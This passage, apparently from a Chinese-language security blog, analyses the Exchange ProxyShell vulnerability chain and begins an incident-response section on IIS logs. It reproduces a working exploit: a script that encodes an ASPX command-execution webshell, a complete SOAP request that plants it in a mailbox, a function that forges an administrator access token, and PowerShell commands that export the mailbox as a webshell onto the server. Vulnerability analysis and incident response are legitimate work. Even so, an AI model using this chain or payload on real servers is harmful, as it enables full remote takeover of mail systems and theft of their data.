b[<span class="hljs-number">2</span>]<br>            tmp[i + <span class="hljs-number">3</span>] = b[<span class="hljs-number">3</span>]<br>            i += DWORD_SIZE<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(b) != DWORD_SIZE:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(tmp) <span class="hljs-keyword">if</span> six.PY3 <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>.join(tmp)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    webshell = <span class="hljs-string">b&quot;&lt;script language=&#x27;JScript&#x27; runat=&#x27;server&#x27; Page aspcompat=true&gt;function Page_Load()&#123;eval(Request[&#x27;cmd&#x27;],&#x27;unsafe&#x27;);&#125;&lt;/script&gt;&quot;</span><br>    v1 = cryptpermute(webshell, <span class="hljs-literal">False</span>)<br>    b64_data = base64.b64encode(v1).decode()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Encode webshell ⬇\n&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(b64_data))<br><br>    encode_shell = base64.b64decode(b64_data)<br>    decode_shell = cryptpermute(encode_shell, <span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Decode webshell ⬇\n&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(decode_shell.decode()))<br></code></pre></td></tr></table></figure>
<p><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630220327242-f6d61b9d-9921-4c9e-9011-78093b69359a.png#clientId=ua934db88-dbfc-4&from=paste&height=336&id=essZX&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=3348&originalType=binary&ratio=1&size=654186&status=done&style=none&taskId=u8de9fb99-a186-4863-88b8-2399a155bf8&width=3348" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<p>content 内容中为 webshell 加密后再进行 base64 编码的内容，再后续执行“保存邮件草稿”请求，导出 webshell 将会还原为原始的 webshell 内容，从而完成写 webshell 操作。</p>
<p><strong>注意</strong>：经过测试 CSharpDynamicPayload 中的 CSHAP_AES_BASE64，生成的 webshell 需要将其中所有的 Session 替换成 Application。</p>
<h4 id="b-投递载荷"><a href="#b-投递载荷" class="headerlink" title="b. 投递载荷"></a>b. 投递载荷</h4><p>在Header中使用 SerializedSecurityContext，指定用户身份进行EWS调用操作。</p>
<p>SOAP 请求主要参数：</p>
<ul>
<li>&lt;t:UserSid&gt; — 构造的用户 sid</li>
<li>&lt;t:Content&gt; — 加密编码后的 webshell 内容</li>
<li>&lt;t:EmailAddress&gt; — 要发送的邮箱地址<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/autodiscover/autodiscover.json?a=Administrator@king.cn//EWS/Exchange.asmx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>mail.king.com<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Email=autodiscover/autodiscover.json?a=Administrator@king.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1645<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>python-urllib3/1.26.6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">xmlns:t</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Header</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">t:RequestServerVersion</span> <span class="hljs-attr">Version</span>=<span class="hljs-string">&quot;Exchange2016&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">t:SerializedSecurityContext</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">t:UserSid</span>&gt;</span>S-1-5-21-803738369-70637960-3765207648-500<span class="hljs-tag">&lt;/<span class="hljs-name">t:UserSid</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">t:GroupSids</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">t:GroupIdentifier</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">t:SecurityIdentifier</span>&gt;</span>S-1-5-21<span class="hljs-tag">&lt;/<span class="hljs-name">t:SecurityIdentifier</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">t:GroupIdentifier</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">t:GroupSids</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">t:SerializedSecurityContext</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Header</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">m:CreateItem</span> <span class="hljs-attr">MessageDisposition</span>=<span class="hljs-string">&quot;SaveOnly&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">m:Items</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">t:Message</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">t:Subject</span>&gt;</span>dummy<span class="hljs-tag">&lt;/<span class="hljs-name">t:Subject</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">t:Body</span> <span class="hljs-attr">BodyType</span>=<span class="hljs-string">&quot;HTML&quot;</span>&gt;</span>hello from darkness side<span class="hljs-tag">&lt;/<span class="hljs-name">t:Body</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">t:Attachments</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">t:FileAttachment</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">t:Name</span>&gt;</span>FileAttachment.txt<span class="hljs-tag">&lt;/<span class="hljs-name">t:Name</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">t:IsInline</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">t:IsInline</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">t:IsContactPhoto</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">t:IsContactPhoto</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">t:Content</span>&gt;</span>ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ<span class="hljs-tag">&lt;/<span class="hljs-name">t:Content</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">t:FileAttachment</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">t:Attachments</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">t:ToRecipients</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">t:Mailbox</span>&gt;</span></span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">t:EmailAddress</span>&gt;</span>Administrator@king.cn<span class="hljs-tag">&lt;/<span class="hljs-name">t:EmailAddress</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">t:Mailbox</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">t:ToRecipients</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">t:Message</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">m:Items</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">m:CreateItem</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
<img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630219691285-b7f1c9cd-92d7-473f-840d-19a9a46962f0.png#clientId=ua934db88-dbfc-4&from=paste&height=631&id=JsPDS&margin=%5Bobject%20Object%5D&name=image.png&originHeight=631&originWidth=1080&originalType=binary&ratio=1&size=714630&status=done&style=none&taskId=ub8ead3ca-72c7-4e1f-a56c-572ca2239b3&width=1080" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></li>
</ul>
<h3 id="（6）导出邮件完成写-webshell"><a href="#（6）导出邮件完成写-webshell" class="headerlink" title="（6）导出邮件完成写 webshell"></a>（6）导出邮件完成写 webshell</h3><p><strong>添加导出权限：</strong>通过 Exchange PowerShell 命令 <code>New-ManagementRoleAssignment</code> 授予我们自己的邮箱导入导出角色。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-ManagementRoleAssignment</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> <span class="hljs-literal">-User</span> <span class="hljs-string">&quot;Administrator&quot;</span> <span class="hljs-literal">-Role</span> <span class="hljs-string">&quot;Mailbox Import Export&quot;</span><br></code></pre></td></tr></table></figure>
<p>通过 Exchange PowerShell 命令 <code>New-MailboxExportRequest</code> 导出邮件，实现写 webshell。<br>由于该命令导出文件保存位置参数 FilePath 没有对文件路径、文件名及文件后缀进行限制，实际上可以实现任意文件写入。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-MailboxExportRequest</span> <span class="hljs-literal">-Mailbox</span> Administrator <span class="hljs-literal">-FilePath</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">100.194</span>\intepub\xx.aspx<br></code></pre></td></tr></table></figure>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="2、ProxyShell-漏洞分析"><a href="#2、ProxyShell-漏洞分析" class="headerlink" title="2、ProxyShell 漏洞分析"></a>2、ProxyShell 漏洞分析</h2><ul>
<li>CVE-2021-34473：预认证路径混淆漏洞，导致ACL绕过（已在四月修复）</li>
<li>CVE-2021-34523：Exchange PowerShell 后端上的提权漏洞（已在四月修复）</li>
<li>CVE-2021-31207：利用后任意文件写漏洞导致远程代码执行漏洞（已在五月修复）</li>
</ul>
<h3 id="（1）SSRF（CVE-2021-34473）"><a href="#（1）SSRF（CVE-2021-34473）" class="headerlink" title="（1）SSRF（CVE-2021-34473）"></a>（1）SSRF（CVE-2021-34473）</h3><p>ProxyShell 漏洞始于 URI 解析导致的路径混淆引起的 SSRF。由于 Exchange 的逻辑问题，产生的一条 SSRF 利用链，通过该漏洞，可以间接访问内部网络。</p>
<p>Exchange 从 URL 中提取邮箱：<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630223276550-eb788ca2-559c-4e8d-a197-d19214714844.png#clientId=ua934db88-dbfc-4&from=paste&height=656&id=GG1QQ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=656&originWidth=1214&originalType=binary&ratio=1&size=111800&status=done&style=none&taskId=u93c6df93-4dda-4925-b9bb-3a4c862c473&width=1214" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<p>核心的错误在于下图，通过处理之后，将请求 uri：<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630223394316-4755f2df-e51a-4717-9347-b37c394ff1f3.png#clientId=ua934db88-dbfc-4&from=paste&height=670&id=GPBN7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=1237&originalType=binary&ratio=1&size=118175&status=done&style=none&taskId=u3f65d829-0b15-4090-a5ff-6ea47423ee5&width=1237" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<p>结合起来如下图所示，被 removed 后面的部分，就是被带入 ssrf 的内容：<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630223484168-2a74c194-86f9-4904-ab05-4c0e79f36b1f.png#clientId=ua934db88-dbfc-4&from=paste&height=401&id=QfgEj&margin=%5Bobject%20Object%5D&name=image.png&originHeight=401&originWidth=1265&originalType=binary&ratio=1&size=54217&status=done&style=none&taskId=u74075867-7adb-4cec-bc51-391bb20037d&width=1265" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span><br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630223741879-2aa74376-3fd4-4565-ae20-b4019f157814.png#clientId=ua934db88-dbfc-4&from=paste&height=366&id=HyQy3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=366&originWidth=1243&originalType=binary&ratio=1&size=45550&status=done&style=none&taskId=u006bc8d4-4931-42f4-8307-ddbd63e69d8&width=1243" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span><br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630223982253-b64c306a-5750-4862-a472-e86bb297a6a5.png#clientId=ua934db88-dbfc-4&from=paste&height=245&id=QuIX3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=245&originWidth=1152&originalType=binary&ratio=1&size=25620&status=done&style=none&taskId=u0faa3887-9984-4fd4-a724-c6942203e7d&width=1152" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<h3 id="（2）Exchange-PowerShell（CVE-2021-34523）"><a href="#（2）Exchange-PowerShell（CVE-2021-34523）" class="headerlink" title="（2）Exchange PowerShell（CVE-2021-34523）"></a>（2）Exchange PowerShell（CVE-2021-34523）</h3><p>Exchange PowerShell 远程处理是一个命令行界面，用于 Exchange 任务的自动化。通过前面的 SSRF 漏洞，可以尝试访问 Exchange 的 <code>/powershell</code> 接口与 Exchange PowerShell 进行通信，从而执行一些命令。但是，Exchange PowerShell 存在两个问题问题：</p>
<ul>
<li>Exchange PowerShell Remoting 基于 PowerShell API 构建，并使用用于隔离的运行空间。所有操作均基于 WinRM 协议；</li>
<li>由于通过 SSRF 访问 powershell 接口，使用的权限是“NT Authroity&#x2F;System”，因为没有 system 用户的邮箱，无法进行身份认证，导致与 PowerShell 后端交互失败。因此，要想利用 powershell 接口就需要进行降权。</li>
</ul>
<p><strong>X-CommonAccessToken</strong></p>
<p>Orange 大佬研究发现了一段从 URL 中提取 Access-Token 的代码，也就是说这个接口通过另一个方式来认证，即 X-CommonAccessToken。<br>需要注意的是，“X-CommonAccessToken”这种方式默认是从 HTTP 请求头中获取的，但是前端并不会将关于 powershell 认证的头一并转发到后端，例如：“X-CommonAccessToken”标头。<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630224139385-82e93161-925b-4cc0-a658-86fabb8570fe.png#clientId=ua934db88-dbfc-4&from=paste&height=633&id=VpE47&margin=%5Bobject%20Object%5D&name=image.png&originHeight=633&originWidth=1146&originalType=binary&ratio=1&size=109626&status=done&style=none&taskId=u94fc2269-6464-4525-b61c-f0f8b1d9bf0&width=1146" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<p>但是，Exchange 使用了另一个关键函数 <code>CommonAccessTokenFromUrl</code>。<br>当 SSRF 请求中不存在 X-CommonsAccessToken 请求头的情况下，会尝试从 URI 的参数中获取 X-Rps-CAT 的值作为 ComonAccessToken 头。<br>通过这个函数，就能将 commonAccessToken 通过 GET 请求参数 <code>X-Rps-CAT</code> 传入 Token 内容，也就能被 SSRF 进行利用。<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630224194167-833be4c2-2d5d-4e0a-b6de-b06c05b7a485.png#clientId=ua934db88-dbfc-4&from=paste&height=648&id=DMACD&margin=%5Bobject%20Object%5D&name=image.png&originHeight=648&originWidth=1157&originalType=binary&ratio=1&size=93630&status=done&style=none&taskId=udb6dc817-dbdc-4ad8-852c-3fa7dcfe297&width=1157" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<pre><code>通过反编译分析，X-Rps-CAT 是一个序列化的数据，其结构相对简单，但是需要一个有关用户的值，比如sid、组 sid 等等，这里需要做到从 system 用户降级到 exchange 的管理权限，于是先从 autodiscover 接口获取了 administrator 用户的 sid，然后构造了一个 administrator 用户的 token， 将其带入 X-Rps-CAT 中，在 X-Rps-CAT 中指定访问令牌以模拟任何用户，从而降级到了 adiministrator。
</code></pre>
<p>其生成的实现在 exp 中的 gen_token 这个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_token</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-comment"># From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/</span><br>  version = <span class="hljs-number">0</span><br>  ttype = <span class="hljs-string">&#x27;Windows&#x27;</span><br>  compressed = <span class="hljs-number">0</span><br>  auth_type = <span class="hljs-string">&#x27;Kerberos&#x27;</span><br>  raw_token = <span class="hljs-string">b&#x27;&#x27;</span><br>  gsid = <span class="hljs-string">&#x27;S-1-5-32-544&#x27;</span><br>  version_data = <span class="hljs-string">b&#x27;V&#x27;</span> + ( <span class="hljs-number">1</span> ).to_bytes( <span class="hljs-number">1</span> , <span class="hljs-string">&#x27;little&#x27;</span>) + (version).to_bytes( <span class="hljs-number">1</span> , <span class="hljs-string">&#x27;little&#x27;</span>)<br>  type_data = <span class="hljs-string">b&#x27;T&#x27;</span> + (<span class="hljs-built_in">len</span>(ttype)).to_bytes( <span class="hljs-number">1</span> , <span class="hljs-string">&#x27;little&#x27;</span>) + ttype.encode()<br>  compress_data = <span class="hljs-string">b&#x27;C&#x27;</span> + (compressed).to_bytes( <span class="hljs-number">1</span> , <span class="hljs-string">&#x27;little&#x27;</span>)<br>  auth_data = <span class="hljs-string">b&#x27;A&#x27;</span> + (<span class="hljs-built_in">len</span>(auth_type)).to_bytes( <span class="hljs-number">1</span> , <span class="hljs-string">&#x27;little&#x27;</span>) + auth_type.encode()<br>  login_data = <span class="hljs-string">b&#x27;L&#x27;</span> + (<span class="hljs-built_in">len</span>(self.email)).to_bytes( <span class="hljs-number">1</span> , <span class="hljs-string">&#x27;little&#x27;</span>) + self.email.encode()<br>  user_data = <span class="hljs-string">b&#x27;U&#x27;</span> + (<span class="hljs-built_in">len</span>(self.sid)).to_bytes( <span class="hljs-number">1</span> , <span class="hljs-string">&#x27;little&#x27;</span>) + self.sid.encode()<br>  group_data = <span class="hljs-string">b&#x27;G&#x27;</span> + struct.pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, <span class="hljs-number">1</span> , <span class="hljs-number">7</span> ) + (<span class="hljs-built_in">len</span>(gsid)).to_bytes( <span class="hljs-number">1</span> , <span class="hljs-string">&#x27;little&#x27;</span>) + gsid.encode()<br>  ext_data = <span class="hljs-string">b&#x27;E&#x27;</span> + struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, <span class="hljs-number">0</span> )<br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">raw_token += version_data<br>  raw_token += type_data<br>  raw_token += compress_data<br>  raw_token += auth_data<br>  raw_token += login_data<br>  raw_token += user_data<br>  raw_token += group_data<br>  raw_token += ext_data<br><br>  data = base64.b64encode(raw_token).decode()<br><br>  <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure>

<h3 id="（4）写-Webshell（CVE-2021-31207）"><a href="#（4）写-Webshell（CVE-2021-31207）" class="headerlink" title="（4）写 Webshell（CVE-2021-31207）"></a>（4）写 Webshell（CVE-2021-31207）</h3><p>在获取了 Exchange 的管理 Powershell 接口之后，就可以进行利用。<br>由于通过前面的降权处理，获得的是 Exchange 管理员权限，因此很容易滥用 Exchange PowerShell 命令 <code>New-MailboxExportRequest</code> ，该命令可以将用户的邮箱导出到 UNC 路径。<br>利用该命令，就有了一个攻击思路：可以通过构造一封含有 webshell 的邮件，然后将该邮件导出到指定磁盘路径下从而实现 webshell 写入：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">New-MailboxExportRequest –Mailbox king@king.local –FilePath<br>\\<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>\C$\path\to\shell.aspx<br></code></pre></td></tr></table></figure>
<p>但是，该命令默认导出的格式是 pst，并且 pst 格式会对内容进行加密，直接在邮件中写入 webshell 并不会生效。<br>Orange 对 pst 格式进行了研究，去阅读了 MS-PST 的文档，发现其使用的加密为类似异或加密模式，也就是说加密在加密就变成了明文，那么只要先使用其加密方法加密一遍我们要写入的 webshell，那么再导出后获得的就是明文。<br>MS-PST 官方文档：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-<span class="hljs-number">9457</span>-2ac40eb467bd<br></code></pre></td></tr></table></figure>
<p>但是，在这之前还需要让我们控制的用户拥有导出邮件的权限。可以借助于 Exchange Powershell 命令<code>New-ManagementRoleAssignment</code>，该命令可以将邮箱导入导出的角色分配给用户，然后导致构造的 webshell 邮件到指定路径，从而写入原始 webshell。</p>
<h2 id="3、ProxyShell-应急分析"><a href="#3、ProxyShell-应急分析" class="headerlink" title="3、ProxyShell 应急分析"></a>3、ProxyShell 应急分析</h2><h3 id="（1）Exchange-IIS-日志分析"><a href="#（1）Exchange-IIS-日志分析" class="headerlink" title="（1）Exchange IIS 日志分析"></a>（1）Exchange IIS 日志分析</h3><p>Exchange 访问日志默认和 IIS 日志路径一致：<code> %SystemDrive%\inetpub\logs\LogFiles</code><br>具体日志存储位置可在 IIS 管理器中查看：<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630337098177-e25da783-bbc8-4a8f-ba7d-76848e38ad30.png#clientId=uf4e35cdb-e404-4&from=paste&height=1232&id=u446b117a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1232&originWidth=2228&originalType=binary&ratio=1&size=243778&status=done&style=none&taskId=u45125a72-3c34-4e61-a031-84eb8877d2b&width=2228" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span><br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630337119200-f61889a8-706d-4733-80b3-9e335414b861.png#clientId=uf4e35cdb-e404-4&from=paste&height=1232&id=u150a9423&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1232&originWidth=1918&originalType=binary&ratio=1&size=139490&status=done&style=none&taskId=ue3a3b4e7-8586-4fdc-863a-b0b87b6971e&width=1918" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span></p>
<p>Exchange 一般会有两个日志目录<code>W3SVC1</code> 和 <code>W3SVC2</code> ，默认 W3SVC1 下记录前端 CAS 即用户访问日志，W3SVC2 下记录后端即 Exchange 服务间的访问日志。具体对应关系可在 IIS 管理器中查看。<br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630383936566-9f464ae8-0d7f-411e-9794-1382c9177e7a.png#clientId=u76956966-30c8-4&from=paste&height=404&id=ua110f7c2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=404&originWidth=1236&originalType=binary&ratio=1&size=59794&status=done&style=none&taskId=u435c16c6-43e3-47bd-a976-e5a5cba813b&width=1236" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image.png</span><br><img    class="lazyload" data-original="https://cdn.nlark.com/yuque/0/2021/png/1618485/1630337173135-02e6b9d8-2831-49a9-9d98-90f50e0399e4.png#clientId=uf4e35cdb-e404-4&from=paste&height=558&id=u7908111c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=558&originWidth=1596&originalType=binary&ratio=1&size=92545&status=done&style=none&taskId=u056e41d7-6423-4202-b8c9-ff77c8ea1d8&width=1596" 